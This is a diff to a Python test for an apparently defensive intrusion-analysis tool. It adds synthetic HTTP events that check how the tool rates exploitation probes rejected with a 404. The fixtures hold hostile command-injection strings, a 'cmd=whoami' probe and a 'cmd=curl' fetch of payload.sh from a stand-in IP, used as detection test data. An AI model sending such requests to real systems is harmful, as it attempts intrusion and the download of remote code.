@@ -43,7 +43,53 @@ def main() -> None:
     assert impact["verdict"] == "Likely exploitation attempt"
     assert "CVE-2021-44228" in impact["related_cves"]
 
+    rejected_cmd = HttpEvent(
+        event_id="pkt-4",
+        timestamp=2.0,
+        src_ip="10.0.0.1",
+        src_port=12346,
+        dst_ip="10.0.0.2",
+        dst_port=80,
+        protocol="HTTP",
+        payload_clean="GET /shell?cmd=whoami HTTP/1.1",
+        summary="command probe",
+        method="GET",
+        uri="/shell?cmd=whoami",
+        host="victim",
+        user_agent="curl",
+        headers={},
+        status_code=404,
+    )
+    rejected_download = HttpEvent(
+        event_id="pkt-5",
+        timestamp=3.0,
+        src_ip="10.0.0.1",
+        src_port=12347,
+        dst_ip="10.0.0.2",
+        dst_port=80,
+        protocol="HTTP",
+        payload_clean="GET /api?cmd=curl%20http://203.0.113.50/payload.sh HTTP/1.1",
+        summary="download probe",
+        method="GET",
+        uri="/api?cmd=curl%20http://203.0.113.50/payload.sh",
+        host="victim",
+        user_agent="curl",
+        headers={},
+        status_code=404,
+    )
+    rejected_impact = assess_impact(
+        [rejected_cmd, rejected_download],
+        [
+            {"stage": "Command Execution", "confidence": "medium", "evidence_ids": ["pkt-4"]},
+            {"stage": "Payload Delivery", "confidence": "medium", "evidence_ids": ["pkt-5"]},
+        ],
+        [],
+        [],
+    )
+    assert rejected_impact["verdict"] == "Possible exploitation attempt"
+    assert rejected_impact["confidence"] == "low"
+    assert "4xx" in rejected_impact["missing_evidence"][-1]
+
 
 if __name__ == "__main__":
     main()
-
